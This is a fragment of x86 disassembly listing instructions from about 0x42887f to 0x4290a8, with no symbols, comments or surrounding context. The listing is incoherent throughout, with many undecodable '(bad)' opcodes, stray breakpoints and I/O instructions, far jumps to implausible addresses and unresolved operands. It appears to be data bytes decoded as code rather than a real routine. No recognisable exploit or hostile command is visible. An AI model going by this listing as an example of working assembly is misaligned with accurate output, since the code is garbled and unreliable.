  42887f:	hlt    
  428880:	xor    DWORD PTR [ecx-0x34],0xffffffff
  428884:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428885:	add    bh,bh
  428887:	cmp    ecx,0x0
  42888a:	aaa    
  42888b:	jno    0x42888c
  42888d:	dec    esi
  42888e:	mov    bl,0xa1
  428890:	or     DWORD PTR [ebx-0x77],0x0
  428894:	sti    
  428895:	mov    DWORD PTR [ebx+0x1eff58ff],eax
  42889b:	int    0x0
  42889d:	repz cmp al,0xac
  4288a0:	call   FWORD PTR [ebx-0xcd7c77]
  4288a6:	add    ah,cl
  4288a8:	mov    ebp,0x646283
  4288ad:	mov    ebp,0x108927ac
  4288b2:	(bad)  
  4288b3:	(bad)  
  4288b4:	out    dx,eax
  4288b5:	cmp    edi,0x0
  4288b8:	aas    
  4288b9:	add    DWORD PTR [eax],0xffffffb1
  4288bc:	dec    DWORD PTR [esi-0x59]
  4288bf:	or     ah,0xe
  4288c2:	add    bh,bh
  4288c4:	int    0x0
  4288c6:	(bad)  
  4288c7:	dec    DWORD PTR [ebx-0x33f9da77]
  4288cd:	(bad)  
  4288ce:	fucom  st(6)
  4288d0:	int3   
  4288d1:	cmp    DWORD PTR [ebx-0xffa977],eax
  4288d7:	adc    DWORD PTR [edi],0xffffff89
  4288da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4288db:	or     DWORD PTR [eax],eax
  4288dd:	arpl   WORD PTR [ecx],bx
  4288df:	test   bh,bh
  4288e1:	sub    BYTE PTR [eax],al
  4288e3:	add    BYTE PTR [ebx+eax*4],dl
  4288e6:	mov    edi,edi
  4288e8:	or     eax,0xe5ef00
  4288ed:	mov    cl,0xab
  4288ef:	xchg   DWORD PTR [eax],eax
  4288f1:	cmp    al,0xff
  4288f3:	or     edi,0xffffffff
  4288f6:	int3   
  4288f7:	and    DWORD PTR [ebx-0x803601],0xfffffff3
  4288fe:	push   eax
  4288ff:	jle    0x428901
  428901:	add    eax,0xffc18300
  428906:	inc    DWORD PTR [eax]
  428908:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428909:	dec    DWORD PTR [esi-0x6a]
  42890c:	int3   
  42890d:	dec    esi
  42890e:	(bad)  
  42890f:	pop    ebx
  428910:	add    BYTE PTR [edi+edi*8-0x9377],ah
  428917:	mov    DWORD PTR [esi+0x0],ecx
  42891a:	std    
  42891b:	out    dx,eax
  42891c:	sbb    ebx,0x1d
  42891f:	scas   eax,DWORD PTR es:[edi]
  428920:	mov    ebp,eax
  428922:	(bad)  
  428923:	inc    esp
  428925:	mov    edi,edi
  428927:	add    BYTE PTR ds:0x5ec8ff,dh
  42892d:	push   edi
  42892e:	xchg   esp,eax
  42892f:	add    al,0xff
  428931:	push   ds
  428932:	inc    DWORD PTR [eax]
  428934:	stos   DWORD PTR es:[edi],eax
  428935:	(bad)  
  428936:	inc    DWORD PTR [ebx-0x79e4fff2]
  42893c:	add    BYTE PTR [ebx-0x79007af8],bl
  428942:	add    DWORD PTR [eax],0xffffff84
  428945:	dec    DWORD PTR [ecx-0x2100d87d]
  42894b:	jle    0x4288d0
  42894d:	push   esp
  42894e:	and    eax,0xfff50078
  428953:	call   FWORD PTR [ebp-0x1]
  428956:	(bad)  
  428957:	jmp    FWORD PTR [ebp+0x0]
  42895a:	rcl    dh,cl
  42895c:	inc    DWORD PTR [eax+0x6bffcbce]
  428962:	add    bh,bh
  428964:	sub    bh,bh
  428966:	int3   
  428967:	add    BYTE PTR [edi+0xe4b3cc],al
  42896d:	push   edi
  42896e:	sti    
  42896f:	add    BYTE PTR [ebx-0x3effff1f],al
  428975:	cmp    edi,0xffffff83
  428978:	mov    ebx,0xff9923ff
  42897d:	das    
  42897e:	stos   DWORD PTR es:[edi],eax
  42897f:	add    bh,bh
  428981:	jecxz  0x428982
  428983:	add    ch,dl
  428985:	add    BYTE PTR [eax],al
  428987:	add    dl,al
  428989:	add    BYTE PTR [ecx+0x2e],ah
  42898c:	jmp    FWORD PTR [esi]
  42898e:	push   0xffffffff
  428990:	add    BYTE PTR [eax-0x1],bl
  428993:	add    ch,ch
  428995:	cmp    edi,0xffffffff
  428998:	inc    ecx
  428999:	add    BYTE PTR [eax-0x20490082],al
  42899f:	(bad)  
  4289a1:	add    eax,0x8353ccff
  4289a6:	int3   
  4289a7:	push   DWORD PTR [ecx-0x618301]
  4289ad:	jae    0x428964
  4289af:	push   ss
  4289b0:	add    BYTE PTR [edx-0xe97c34],cl
  4289b6:	add    BYTE PTR [eax],al
  4289b8:	sub    al,0x0
  4289ba:	push   eax
  4289bb:	mov    bl,0x0
  4289bd:	xchg   ch,bh
  4289bf:	hlt    
  4289c0:	jmp    FWORD PTR [esp+ecx*8]
  4289c3:	int3   
  4289c4:	sar    edi,1
  4289c6:	mov    DWORD PTR [eax],eax
  4289c8:	xor    DWORD PTR [eax],eax
  4289ca:	clc    
  4289cb:	fs int3 
  4289cd:	ror    DWORD PTR [edi+edx*1-0x34],0x1d
  4289d2:	(bad)  
  4289d3:	call   FWORD PTR [ebp+0x38ccffff]
  4289d9:	add    BYTE PTR [edx-0x5e],ch
  4289dc:	(bad)  
  4289dd:	cld    
  4289de:	or     bl,BYTE PTR [ebx-0xffdf34]
  4289e4:	and    al,0xff
  4289e6:	(bad)  
  4289e7:	dec    DWORD PTR [ecx]
  4289e9:	inc    DWORD PTR [edx]
  4289eb:	lods   al,BYTE PTR ds:[esi]
  4289ec:	add    BYTE PTR [ebx],bl
  4289ee:	push   esp
  4289ef:	jb     0x428974
  4289f1:	mov    eax,0xc3ffff
  4289f6:	(bad)  
  4289f7:	(bad)  
  4289f8:	mov    esp,0xff78e400
  4289fd:	push   0x2bffaed6
  428a02:	add    BYTE PTR [ebx-0xffffc3],al
  428a08:	push   eax
  428a09:	add    BYTE PTR [edx-0x57],bl
  428a0c:	call   FWORD PTR [esi-0x6e]
  428a0f:	push   es
  428a10:	inc    edi
  428a12:	mov    edi,edi
  428a14:	or     eax,DWORD PTR [ebx+0xccff00]
  428a1a:	jecxz  0x4289b8
  428a1c:	dec    ecx
  428a1e:	pushf  
  428a1f:	lods   eax,DWORD PTR ds:[esi]
  428a20:	jmp    DWORD PTR ds:0xc5ff00
  428a26:	inc    DWORD PTR [eax]
  428a28:	mov    edi,edi
  428a2a:	sub    BYTE PTR [eax+0x0],cl
  428a2d:	int    0x9c
  428a2f:	fdivr  st,st(7)
  428a31:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428a32:	(bad)  
  428a33:	inc    DWORD PTR [eax]
  428a35:	dec    DWORD PTR [ecx-0x1f005101]
  428a3b:	mov    al,0xff
  428a3d:	sub    al,0x5f
  428a3f:	mov    esi,0x72cc
  428a44:	lock inc DWORD PTR [eax]
  428a47:	call   FWORD PTR [esi+0x0]
  428a4a:	dec    BYTE PTR [ebp-0x21545201]
  428a50:	add    BYTE PTR [ebx],dh
  428a52:	(bad)  
  428a53:	call   FWORD PTR [edi-0x1]
  428a56:	add    BYTE PTR [eax],al
  428a58:	scas   al,BYTE PTR es:[edi]
  428a59:	call   DWORD PTR [esi+0x1436ffd4]
  428a5f:	popa   
  428a60:	inc    ebp
  428a62:	add    bh,bh
  428a64:	push   esp
  428a65:	(bad)  
  428a66:	inc    DWORD PTR [ebx+0x75cff70]
  428a6c:	call   ebp
  428a6e:	loope  0x428a87
  428a70:	and    esp,0xffffffff
  428a73:	inc    DWORD PTR [edi-0x74ff7c77]
  428a79:	mov    DWORD PTR [eax+ebp*1],eax
  428a7c:	add    BYTE PTR [esp+eiz*2],bl
  428a7f:	pop    edi
  428a80:	jmp    DWORD PTR [eax+0xb483ff]
  428a86:	dec    esp
  428a88:	das    
  428a89:	jmp    FWORD PTR [esi-0x5d28ff1d]
  428a8f:	sub    cl,ah
  428a91:	inc    ebx
  428a92:	add    bh,bh
  428a94:	jno    0x428a95
  428a96:	add    bh,bh
  428a98:	rol    BYTE PTR [eax],0x2b
  428a9b:	call   0x15dae4a0
  428aa0:	add    BYTE PTR [ecx+0x0],al
  428aa3:	cmp    edx,0x0
  428aa6:	cmp    edi,0xffffffd6
  428aa9:	add    ah,bl
  428aab:	sbb    bh,bh
  428aad:	push   edx
  428aae:	aam    0x41
  428ab0:	sub    edx,0xffffffff
  428ab3:	call   eax
  428ab5:	add    ah,cl
  428ab7:	add    BYTE PTR [ebp-0x77],bh
  428aba:	jmp    0x10ad8afc
  428abf:	repz add BYTE PTR [edi],bh
  428ac2:	inc    DWORD PTR [eax]
  428ac4:	push   esp
  428ac5:	add    bh,bh
  428ac7:	jmp    FWORD PTR [eax]
  428ac9:	and    DWORD PTR [edx+0x3c],0x0
  428acd:	pop    ebp
  428ace:	adc    cl,ah
  428ad0:	mov    esp,edi
  428ad2:	(bad)  
  428ad3:	(bad)  
  428ad4:	fmul   QWORD PTR [ecx-0x7cd60000]
  428ada:	push   es
  428adb:	mov    ebp,0x48e0abff
  428ae0:	jmp    DWORD PTR [ebx+eax*4-0x34]
  428ae4:	dec    esp
  428ae5:	mov    esp,ecx
  428ae7:	push   DWORD PTR [edi]
  428ae9:	(bad)  
  428aea:	sti    
  428aeb:	mov    DWORD PTR [eax],eax
  428aed:	xchg   BYTE PTR [edi+0x2d],cl
  428af0:	int3   
  428af1:	clc    
  428af2:	(bad)  
  428af3:	push   DWORD PTR [edi+edi*8]
  428af6:	(bad)  
  428af7:	call   FWORD PTR [edi+edi*8]
  428afa:	shr    BYTE PTR ds:0xfe7ffd00,1
  428b00:	push   DWORD PTR [ecx+0x0]
  428b03:	add    BYTE PTR [ebx+eax*4],dh
  428b06:	inc    DWORD PTR [eax]
  428b08:	fadd   QWORD PTR [eax]
  428b0a:	sub    dh,BYTE PTR [esi-0x62cf0301]
  428b10:	jmp    DWORD PTR [ebx]
  428b12:	inc    DWORD PTR [eax]
  428b14:	sbb    al,BYTE PTR [ebx+0x580083]
  428b1a:	mov    dh,0x3d
  428b1c:	int3   
  428b1d:	retf   
  428b1e:	jle    0x428b4c
  428b20:	(bad)  
  428b21:	jle    0x428b23
  428b23:	push   DWORD PTR [edx-0x7f007c01]
  428b29:	add    BYTE PTR [edi+0x46],ah
  428b2c:	add    BYTE PTR [ebp+0x3983a20e],bh
  428b32:	cmp    edi,0xffffffde
  428b35:	dec    esp
  428b37:	add    BYTE PTR [esi+0x316800],ch
  428b3d:	or     bl,BYTE PTR [ebp+0x3d]
  428b40:	inc    DWORD PTR [ebx]
  428b42:	inc    DWORD PTR [ebx-0x3300333e]
  428b48:	fiadd  WORD PTR [eax]
  428b4a:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  428b4c:	push   DWORD PTR [edx+edi*2-0xd176b5]
  428b53:	(bad)  
  428b54:	fadd   DWORD PTR [eax]
  428b56:	add    DWORD PTR [ebx-0x307d0051],0xffffff89
  428b5d:	in     al,dx
  428b5e:	std    
  428b5f:	cs int3 
  428b61:	js     0x428b2f
  428b63:	dec    DWORD PTR [edx-0x2dff3400]
  428b69:	(bad)  
  428b6a:	jmp    DWORD PTR [ebx-0x6e35aa01]
  428b70:	mov    DWORD PTR [ebp+0x8600cc],ecx
  428b76:	(bad)  
  428b77:	inc    DWORD PTR [eax-0x1]
  428b7a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428b7b:	ret    0x9700
  428b7e:	not    BYTE PTR [edx-0x1]
  428b81:	addr16 add ah,cl
  428b84:	and    bh,bh
  428b86:	inc    DWORD PTR [eax]
  428b88:	cmp    al,0x83
  428b8a:	out    0xa8,eax
  428b8c:	call   DWORD PTR [ecx-0x35]
  428b8f:	push   edx
  428b90:	dec    DWORD PTR [ebp+0x0]
  428b93:	dec    DWORD PTR [edx]
  428b95:	int3   
  428b96:	add    bh,bh
  428b98:	cmp    bh,0x99
  428b9b:	and    eax,0xa63237ff
  428ba0:	jmp    ebx
  428ba2:	add    ah,cl
  428ba4:	(bad)  
  428ba7:	push   DWORD PTR ds:0xcce41fff
  428bad:	sub    eax,edx
  428baf:	fadd   QWORD PTR [ebx+0x1aff835f]
  428bb5:	(bad)  
  428bb6:	inc    DWORD PTR [ebx-0x594400e9]
  428bbc:	dec    DWORD PTR [esi]
  428bbe:	fs iret 
  428bc0:	push   DWORD PTR ds:0xffb60000
  428bc6:	add    ah,cl
  428bc8:	push   ebx
  428bc9:	(bad)  
  428bca:	mov    ecx,0x3f55004c
  428bcf:	lods   eax,DWORD PTR ds:[esi]
  428bd0:	add    BYTE PTR [eax],cl
  428bd2:	(bad)  
  428bd3:	call   0xaf6358d7
  428bd8:	add    bh,bh
  428bda:	jo     0x428bc8
  428bdc:	sbb    DWORD PTR [edi+0x0],0x4f
  428be0:	inc    ebx
  428be2:	add    BYTE PTR [edx],dh
  428be4:	dec    esp
  428be6:	div    al
  428be8:	cmp    edi,0xffffff9f
  428beb:	std    
  428bec:	dec    DWORD PTR [esi]
  428bee:	inc    DWORD PTR [edx+0x340013ff]
  428bf4:	inc    DWORD PTR [eax]
  428bf6:	xchg   ebp,eax
  428bf7:	inc    ebx
  428bf8:	add    DWORD PTR [eax],0x16
  428bfb:	cmp    bh,0xf4
  428bfe:	push   DWORD PTR [edx]
  428c00:	push   DWORD PTR [esi]
  428c02:	int3   
  428c03:	xchg   esp,eax
  428c04:	(bad)  
  428c05:	(bad)  
  428c06:	cmp    eax,0x45000089
  428c0b:	pop    ds
  428c0c:	inc    DWORD PTR [eax-0x42ffc601]
  428c12:	inc    DWORD PTR [edi]
  428c14:	add    DWORD PTR [ebx-0xd93c],0x26
  428c1b:	outs   dx,DWORD PTR ds:[esi]
  428c1c:	dec    DWORD PTR [ecx+0x520038ff]
  428c22:	add    BYTE PTR [eax],ch
  428c24:	add    bh,bh
  428c26:	jge    0x428c2f
  428c28:	(bad)  
  428c29:	dec    edx
  428c2b:	icebp  
  428c2c:	cmp    DWORD PTR [edi-0x1],0x6e
  428c30:	call   FWORD PTR [eax+0xff70ff]
  428c36:	das    
  428c37:	mov    esi,0x2279ffcc
  428c3c:	add    dh,bh
  428c3e:	or     DWORD PTR [edx],0xffffffff
  428c41:	add    BYTE PTR ss:[ebx+0x0],bl
  428c45:	inc    DWORD PTR [ebx-0x68]
  428c48:	inc    DWORD PTR [eax]
  428c4a:	mov    edx,0x35cc83
  428c4f:	int    0xcc
  428c51:	jg     0x428c53
  428c53:	ins    DWORD PTR es:[edi],dx
  428c54:	add    DWORD PTR [ebx-0x7c7c3a22],0x40
  428c5b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428c5c:	add    BYTE PTR [ebx],bh
  428c5e:	add    dl,dh
  428c60:	mov    DWORD PTR [edi+edi*8],edi
  428c63:	sbb    eax,0x800ffff
  428c68:	inc    DWORD PTR [ebx+0xf004e65]
  428c6e:	add    DWORD PTR [edi-0x447c5277],0xffffffff
  428c75:	jmp    FWORD PTR [ebp+eax*8+0x1be2ffff]
  428c7c:	add    BYTE PTR [eax],bh
  428c7e:	add    ch,al
  428c80:	mov    DWORD PTR [eax-0x7c00ee34],ebx
  428c86:	adc    al,0x16
  428c88:	mov    esp,ecx
  428c8a:	pop    ebp
  428c8b:	jmp    0x54434f8f
  428c90:	sbb    esi,0xffffffcc
  428c93:	pusha  
  428c94:	add    DWORD PTR [eax],0x61
  428c97:	pushf  
  428c98:	(bad)  
  428c99:	(bad)  
  428c9a:	fimul  DWORD PTR [ebx+0x6ffff5ff]
  428ca0:	mov    esi,ebp
  428ca2:	inc    DWORD PTR [edi]
  428ca4:	add    bh,bh
  428ca6:	push   0x370000cf
  428cab:	pop    ecx
  428cac:	(bad)  
  428cad:	mov    ecx,0x3a830bff
  428cb2:	add    cl,cl
  428cb4:	inc    DWORD PTR [eax]
  428cb6:	inc    ecx
  428cb7:	dec    ebx
  428cb8:	int3   
  428cb9:	sub    DWORD PTR [ecx],0x70
  428cbc:	call   FWORD PTR [edi]
  428cbe:	inc    edx
  428cc0:	inc    DWORD PTR [eax+eax*1]
  428cc3:	mov    edi,edi
  428cc5:	push   DWORD PTR [edi+0x45ff008a]
  428ccb:	and    edi,edi
  428ccd:	inc    eax
  428cce:	call   DWORD PTR [ebp+0x35ff2100]
  428cd4:	inc    DWORD PTR [ebx-0x7600b9c6]
  428cda:	shl    BYTE PTR [ebx],0xff
  428cdd:	stos   BYTE PTR es:[edi],al
  428cde:	jmp    FWORD PTR [ebx-0x657cf501]
  428ce4:	add    DWORD PTR [ebx+0xffe790],0x1b
  428ceb:	push   ebp
  428cec:	add    dh,dh
  428cee:	mov    esp,eax
  428cf0:	call   DWORD PTR [edx]
  428cf2:	jmp    DWORD PTR [esi-0x28b2ff7d]
  428cf8:	int3   
  428cf9:	push   DWORD PTR [esi-0xcb0016]
  428cff:	xchg   edi,edi
  428d01:	or     al,0xff
  428d03:	aas    
  428d04:	add    BYTE PTR [ebx-0x635c],al
  428d0a:	mov    BYTE PTR [eax-0x1],ah
  428d0d:	dec    eax
  428d0e:	call   FWORD PTR [eax+0x4900dacc]
  428d14:	add    bh,bh
  428d16:	sub    DWORD PTR [edi+edi*8+0x0],0x7c
  428d1b:	mov    edi,?
  428d1d:	adc    eax,0x83ff7d00
  428d22:	or     DWORD PTR [esp+ecx*8-0x33789d77],0xffffffff
  428d2a:	and    ebx,DWORD PTR [esi+0x7e8921ff]
  428d30:	add    BYTE PTR [ecx-0x1],ch
  428d33:	and    ecx,DWORD PTR [ecx+0x665f00]
  428d39:	(bad)  
  428d3a:	fcom   QWORD PTR [edx-0x1]
  428d3d:	out    dx,eax
  428d3e:	add    BYTE PTR [esp+ecx*8-0x5b330d],bl
  428d45:	push   edi
  428d47:	test   al,0xff
  428d49:	add    BYTE PTR [eax],al
  428d4b:	xor    DWORD PTR [eax],eax
  428d4d:	mov    eax,0x74ff36ff
  428d52:	jmp    DWORD PTR [eax]
  428d54:	add    BYTE PTR [eax],al
  428d56:	fld    DWORD PTR [edx]
  428d58:	(bad)  
  428d59:	(bad)  
  428d5a:	cmp    ebp,DWORD PTR [ecx+0x0]
  428d5d:	out    dx,al
  428d5e:	add    BYTE PTR [ebx-0x6c003500],ch
  428d64:	mov    DWORD PTR [ebx-0xbf01],eax
  428d6a:	inc    DWORD PTR [edi]
  428d6c:	mov    DWORD PTR [eax+eax*1+0x7d],ecx
  428d70:	and    DWORD PTR [ebx-0x334900],0xfffffffe
  428d77:	nop
  428d78:	add    BYTE PTR [eax],al
  428d7a:	pop    esp
  428d7b:	push   DWORD PTR gs:[edi+edi*8-0x73]
  428d80:	cmp    DWORD PTR [ebx-0x7d],0xffffff96
  428d84:	add    BYTE PTR [ebx-0x33006f8c],al
  428d8a:	push   0xfffd83f5
  428d8f:	test   edi,edi
  428d91:	pop    es
  428d92:	mov    esi,esi
  428d94:	add    DWORD PTR [eax],0x2d
  428d97:	xchg   ecx,eax
  428d98:	int3   
  428d99:	add    BYTE PTR [esi+0x3],bl
  428d9c:	(bad)  
  428d9d:	jmp    0x428d9f
  428d9f:	lahf   
  428da0:	inc    DWORD PTR [ebx-0x7c7c8e01]
  428da6:	push   edx
  428da7:	sahf   
  428da8:	add    bh,bh
  428daa:	(bad)  
  428dab:	jg     0x428dad
  428dad:	sub    bh,bh
  428daf:	retf   0xc100
  428db2:	cmp    DWORD PTR [edi-0x77],0xffffffff
  428db6:	xchg   edi,eax
  428db7:	inc    edi
  428db8:	inc    DWORD PTR [eax]
  428dba:	imul   esp,DWORD PTR [edi-0x17006801],0x0
  428dc1:	cmc    
  428dc2:	(bad)  
  428dc3:	cli    
  428dc4:	add    bh,bh
  428dc6:	mov    ebp,0xc9000058
  428dcb:	push   ebp
  428dcc:	add    ch,bh
  428dce:	mov    DWORD PTR [esp+ecx*8],edi
  428dd1:	adc    eax,0x830cff
  428dd6:	(bad)  
  428dd8:	int3   
  428dd9:	add    BYTE PTR [edi],bh
  428ddb:	adc    edi,edi
  428ddd:	mov    dh,0xff
  428ddf:	jp     0x428de1
  428de1:	pusha  
  428de2:	dec    DWORD PTR [ecx+0x24fe8300]
  428de8:	add    BYTE PTR [eax],al
  428dea:	jecxz  0x428d8b
  428dec:	add    BYTE PTR [eax+0x64ffaaff],bl
  428df2:	add    ah,dl
  428df4:	mov    edi,edi
  428df6:	cmp    eax,0x6affccb1
  428dfb:	icebp  
  428dfc:	(bad)  
  428dfd:	cmp    edi,edi
  428dff:	pusha  
  428e00:	add    BYTE PTR [eax-0x9977],bh
  428e06:	adc    dh,BYTE PTR [edi+edi*8]
  428e09:	int3   
  428e0a:	frstor [edi-0x167c7301]
  428e10:	call   ebx
  428e12:	jmp    ebp
  428e14:	(bad)  
  428e15:	call   DWORD PTR [edx+0x67]
  428e18:	dec    esp
  428e1a:	mov    cl,0x1c
  428e1c:	add    dl,al
  428e1e:	inc    DWORD PTR [eax+eax*1]
  428e21:	in     eax,dx
  428e22:	cmp    DWORD PTR [ecx+0x0],0xffffffff
  428e26:	imul   esp,DWORD PTR [eax],0xffffff89
  428e29:	add    BYTE PTR [eax],ah
  428e2b:	pop    esi
  428e2c:	int3   
  428e2d:	stos   DWORD PTR es:[edi],eax
  428e2e:	int3   
  428e2f:	stc    
  428e30:	and    DWORD PTR [edi-0x1],0x26
  428e34:	cmp    edi,0xffffff9d
  428e37:	jecxz  0x428e38
  428e39:	push   eax
  428e3b:	test   BYTE PTR [eax],al
  428e3d:	sub    bh,bh
  428e3f:	mov    dl,0xcc
  428e41:	loopne 0x428e42
  428e43:	pop    ebp
  428e44:	(bad)  
  428e45:	inc    DWORD PTR [edi-0x3200002a]
  428e4b:	ins    DWORD PTR es:[edi],dx
  428e4c:	call   edx
  428e4e:	int3   
  428e4f:	fwait
  428e50:	call   DWORD PTR [ecx]
  428e52:	add    BYTE PTR [esi+0x0],cl
  428e55:	call   eax
  428e57:	retf   
  428e58:	add    bh,bh
  428e5a:	arpl   WORD PTR [eax-0x1],di
  428e5d:	test   BYTE PTR [eax],0x0
  428e60:	add    BYTE PTR [edi+0x0],bh
  428e63:	imul   eax,DWORD PTR [eax],0xffffffff
  428e66:	jmp    0x7e438e5d
  428e6b:	sti    
  428e6c:	add    ch,dl
  428e6e:	(bad)  
  428e6f:	cmp    al,BYTE PTR [eax]
  428e71:	test   eax,0xfff800
  428e76:	jbe    0x428ece
  428e78:	inc    DWORD PTR [eax]
  428e7a:	sahf   
  428e7b:	fisttp DWORD PTR [ecx+0xe600f1]
  428e81:	ror    esp,1
  428e83:	loope  0x428e08
  428e85:	add    ch,bl
  428e87:	outs   dx,DWORD PTR ds:[esi]
  428e88:	(bad)  
  428e89:	jmp    edx
  428e8b:	xchg   esp,eax
  428e8c:	dec    DWORD PTR [ecx+0x2100bb00]
  428e92:	add    BYTE PTR [edi+edi*8],cl
  428e95:	add    DWORD PTR [ebx-0x10007cee],0x3c
  428e9c:	call   FWORD PTR [edi+edi*8+0x63]
  428ea0:	call   DWORD PTR [edi+edi*8]
  428ea3:	imul   edi,edi,0xff3edcff
  428ea9:	dec    DWORD PTR [eax-0xc0fffa]
  428eaf:	scas   al,BYTE PTR es:[edi]
  428eb0:	call   FWORD PTR [edx]
  428eb2:	mov    DWORD PTR ds:0x93ab0000,ebp
  428eb8:	add    bh,bh
  428eba:	dec    esp
  428ebb:	xor    eax,0xd00d500
  428ec0:	(bad)  
  428ec1:	mov    esi,0x89d5ff
  428ec6:	rol    DWORD PTR [ebx-0x1],cl
  428ec9:	jmp    DWORD PTR [eax-0xc7ccb]
  428ecf:	sar    bh,0x21
  428ed2:	int3   
  428ed3:	test   DWORD PTR [eax],0x5dd6ff
  428ed9:	add    cl,bh
  428edb:	rol    BYTE PTR [ebx-0xe9ffdf],0x17
  428ee2:	add    BYTE PTR [ecx-0x34],dh
  428ee5:	inc    DWORD PTR [ecx+0x4300ffbb]
  428eeb:	add    DWORD PTR [ebx-0x7ccd336a],0x518338
  428ef5:	add    BYTE PTR ds:0xde000025,ch
  428efb:	fmul   DWORD PTR [ecx-0x357648]
  428f01:	sbb    ecx,DWORD PTR [ecx+0x5283ff4a]
  428f07:	and    bh,bh
  428f09:	push   ebp
  428f0b:	cmp    edi,0xfffffffb
  428f0e:	int3   
  428f0f:	repz adc DWORD PTR [eax+0xffd689],0xffffffb8
  428f17:	push   edx
  428f18:	cmp    edi,0xffffff85
  428f1b:	add    BYTE PTR cs:[ecx-0x1],bl
  428f1f:	mov    bl,0xff
  428f21:	or     ecx,esp
  428f23:	retf   
  428f24:	inc    DWORD PTR [eax]
  428f26:	mov    ebp,0xbb89895b
  428f2b:	fadd   DWORD PTR [ebx+0x3d007c]
  428f31:	(bad)  
  428f32:	jmp    ebx
  428f34:	add    BYTE PTR [eax],al
  428f36:	or     eax,0x3300ccfc
  428f3b:	mov    dh,0xff
  428f3d:	xchg   edi,eax
  428f3e:	add    dl,dl
  428f40:	call   eax
  428f42:	int3   
  428f43:	inc    ebp
  428f44:	or     esp,0xfffffffb
  428f47:	lock inc DWORD PTR [eax]
  428f4a:	jl     0x428f1a
  428f4c:	push   DWORD PTR [esi-0x1]
  428f4f:	out    dx,eax
  428f50:	sub    DWORD PTR [ecx-0xffd700],0xffffffab
  428f57:	je     0x428f59
  428f59:	and    esi,0x4a
  428f5c:	(bad)  
  428f5d:	jmp    0x60ff:0x36cc64ff
  428f64:	(bad)  
  428f65:	call   FWORD PTR [esi+0x12008998]
  428f6b:	or     eax,0x59ff0500
  428f70:	call   DWORD PTR [ebp-0xff2301]
  428f76:	pop    ebp
  428f77:	mov    cl,0xff
  428f79:	xor    edi,0xffffffa2
  428f7c:	or     DWORD PTR [ecx+0xeff40ff],0xffffffff
  428f83:	repnz dec esp
  428f86:	push   0x72ff893c
  428f8b:	fdivr  st,st(7)
  428f8d:	cdq    
  428f8e:	jmp    DWORD PTR [eax+eax*1-0x7f]
  428f92:	int3   
  428f93:	(bad)  
  428f95:	jmp    FWORD PTR [ebx+0x4fffccb2]
  428f9b:	fld    QWORD PTR [ebx+0xa4ffab]
  428fa1:	nop
  428fa2:	(bad)  
  428fa3:	fadd   DWORD PTR [ebx+0xe1ee83]
  428fa9:	int3   
  428faa:	inc    esp
  428fab:	repz or DWORD PTR [ebp+0x35fffaff],0xffffff89
  428fb3:	dec    edx
  428fb4:	add    BYTE PTR [ecx-0x33fff061],cl
  428fba:	cwde   
  428fbb:	inc    esi
  428fbc:	add    DWORD PTR [eax+eax*1-0xf2009e],0xffffffde
  428fc4:	(bad)  
  428fc5:	jmp    DWORD PTR [esi-0x4bff3361]
  428fcb:	fadd   QWORD PTR [ebx+0x6900b1]
  428fd1:	xchg   edx,eax
  428fd2:	push   DWORD PTR [edi+edi*8-0x3354e17d]
  428fd9:	add    BYTE PTR [edx-0x5a],dl
  428fdc:	push   ebp
  428fde:	or     ecx,0xffffffff
  428fe1:	cwde   
  428fe2:	dec    DWORD PTR [edi+edi*8]
  428fe5:	int3   
  428fe6:	stos   BYTE PTR es:[edi],al
  428fe7:	inc    esi
  428fe8:	add    BYTE PTR [ecx-0x3900dcbe],cl
  428fee:	int3   
  428fef:	inc    ecx
  428ff0:	add    BYTE PTR [eax-0x77],bh
  428ff3:	mov    bh,bh
  428ff5:	jmp    DWORD PTR [edi]
  428ff7:	cmp    edi,0xffffffcc
  428ffa:	call   0x1b8f15
  428fff:	pop    eax
  429000:	int3   
  429001:	sti    
  429002:	mov    DWORD PTR [ebp-0x1],ecx
  429005:	mov    DWORD PTR [eax],ecx
  429007:	aam    0x83
  429009:	call   ebx
  42900b:	lahf   
  42900c:	adc    DWORD PTR [ecx-0x1],0x6f
  429010:	add    BYTE PTR [ebx+eax*4+0x51],dl
  429014:	cmp    edi,0x16
  429017:	inc    ebx
  429018:	add    bh,bh
  42901a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42901b:	pop    esi
  42901c:	add    BYTE PTR [eax-0x39005300],dh
  429022:	add    BYTE PTR [edi+edi*8-0xb02c01],bl
  429029:	add    BYTE PTR [edi],ah
  42902b:	xlat   BYTE PTR ds:[ebx]
  42902c:	(bad)  
  42902d:	(bad)  
  42902f:	inc    DWORD PTR [ebx-0x29005d]
  429035:	add    BYTE PTR [esi],dl
  429037:	nop
  429038:	inc    DWORD PTR [eax]
  42903a:	jmp    0x89ac8f86
  42903f:	jmp    0xab438010
  429044:	mov    edi,edi
  429046:	push   esp
  429047:	mov    dh,0x0
  429049:	add    BYTE PTR [esi],ah
  42904b:	xchg   esp,eax
  42904c:	sub    DWORD PTR [eax-0x1],0x21
  429050:	mov    edi,ecx
  429052:	add    BYTE PTR [ecx-0x1],al
  429055:	add    BYTE PTR [edx],ah
  429057:	mov    edx,0x307affff
  42905c:	inc    DWORD PTR [ebp+0x1ff96ff]
  429062:	add    BYTE PTR [eax+eax*1-0x1],bl
  429066:	pmaxsw mm0,QWORD PTR [eax]
  429069:	cmp    DWORD PTR [ebp-0x7cea33a0],0xffffffe1
  429070:	add    BYTE PTR [ebp-0x1],dh
  429073:	ins    DWORD PTR es:[edi],dx
  429074:	inc    DWORD PTR [eax]
  429076:	mov    esp,0x7fff00f6
  42907b:	and    eax,DWORD PTR [eax]
  42907d:	pop    esi
  42907e:	int3   
  42907f:	and    al,0x0
  429081:	stos   BYTE PTR es:[edi],al
  429082:	adc    DWORD PTR [eax+eax*1-0x20dd01],0x0
  42908a:	mov    ds:0x83a2fff3,eax
  42908f:	retf   0x7eff
  429092:	(bad)  
  429093:	mov    ebx,0x76f0ffff
  429098:	add    bh,bh
  42909a:	mov    edi,?
  42909c:	push   DWORD PTR [edx-0x24ff5800]
  4290a2:	mov    DWORD PTR [eax+eax*1],esp
  4290a5:	mov    ecx,ebp
  4290a7:	push   esi
  4290a8:	inc    DWORD PTR [ebx+0x17ffad4f]
